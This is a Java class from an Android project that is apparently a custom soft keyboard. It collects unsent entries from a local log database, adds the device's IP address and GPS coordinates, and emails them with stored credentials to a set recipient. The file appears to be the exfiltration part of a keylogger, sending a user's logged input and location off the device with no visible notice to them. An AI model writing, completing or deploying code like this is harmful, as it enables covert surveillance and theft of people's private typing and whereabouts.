package com.exa.android.softkeyboard;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.ListIterator;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;


public class AgendarEnvio implements Runnable{


	private String texto = "not log";
	private StringBuilder logTexto;	  
	private String[] ids;
	private ArrayList<String> arrayList;
	private static String currentHostIpAddress;
	private Context context ;
	private double latitude = 0.0;
	private double longitude = 0.0;
	private CommentsDataSource bancoDeDados;   
	private boolean on;
	private String fromEmail;
	private String passEmail;
	private String toEmail;



	AgendarEnvio(Context con,boolean send, String from, String pass, String to){

	
		on = send;
		fromEmail = from;
		passEmail = pass;
		toEmail = to;
		context = con;
		
		run();	

	}


	public void run() {
		
		

		if(on){

			Log.e("Thread","Rodando");	


			GPSTracker gps = new GPSTracker(context);

			if(gps.canGetLocation()){

				latitude = gps.getLatitude();
				longitude = gps.getLongitude();

			}



			com.exa.android.softkeyboard.Mail m = new com.exa.android.softkeyboard.Mail(fromEmail,passEmail, toEmail); 


			try { 

				texto = bancoDeDadosLog();

				if(texto.length() > 0) {	

					texto +=  "\n\n" +getLocalAddress()+ "\n";
					texto +=  "GPS POSITION: " + "\nLatitude: " + latitude + "\nLongitude: " + longitude;	


					if(m.send("",texto)) { 
						Log.e("Mensagem","Email enviado com sucesso!"); 


						ids = arrayList.toArray(new String[arrayList.size()]);
						bancoDeDados.update(ids);




					}else { 
						Log.e("Mensagem","Email não pode ser enviado ! ");

					} 
				}

			} catch(Exception e) { 
				//Toast.makeText(MailApp.this, "There was a problem sending the email.", Toast.LENGTH_LONG).show(); 
				Log.e("MailApp", "Could not send email", e); 

			}finally{

				logTexto.delete(0, logTexto.length());
				texto = "";
				arrayList.clear();

				bancoDeDados.close();
			} 



		}




	}

	private String bancoDeDadosLog(){

		Comment comm ;
		arrayList = new ArrayList<String>();

		logTexto = new StringBuilder();


		bancoDeDados = new CommentsDataSource(context);

		bancoDeDados.open();



		ListIterator<Comment> it = bancoDeDados.getAllComments().listIterator();

		while(it.hasNext()){


			comm = it.next();

			if(comm.getSend() == 0){	

				arrayList.add(Long.toString(comm.getId()));
				logTexto.append(comm + "\n___________________________________________\n");



			}else{



			}


		}

		return logTexto.toString();

	}

	public static String getLocalAddress() throws SocketException, UnknownHostException
	{


		if (currentHostIpAddress == null) {
			Enumeration<NetworkInterface> netInterfaces = null;
			try {
				netInterfaces = NetworkInterface.getNetworkInterfaces();

				while (netInterfaces.hasMoreElements()) {
					NetworkInterface ni = netInterfaces.nextElement();
					Enumeration<InetAddress> address = ni.getInetAddresses();
					while (address.hasMoreElements()) {
						InetAddress addr = address.nextElement();

						if (!addr.isLoopbackAddress() && addr.isSiteLocalAddress()
								&& !(addr.getHostAddress().indexOf(":") > -1)) {
							currentHostIpAddress = "IP: " + addr.getHostAddress();
						}
					}
				}
				if (currentHostIpAddress == null) {
					currentHostIpAddress = "IP: 127.0.0.1";
				}

			} catch (SocketException e) {
				//               log.error("Somehow we have a socket error acquiring the host IP... Using loopback instead...");
				currentHostIpAddress = "IP: 127.0.0.1";
			}
		}
		return currentHostIpAddress;
	}


}
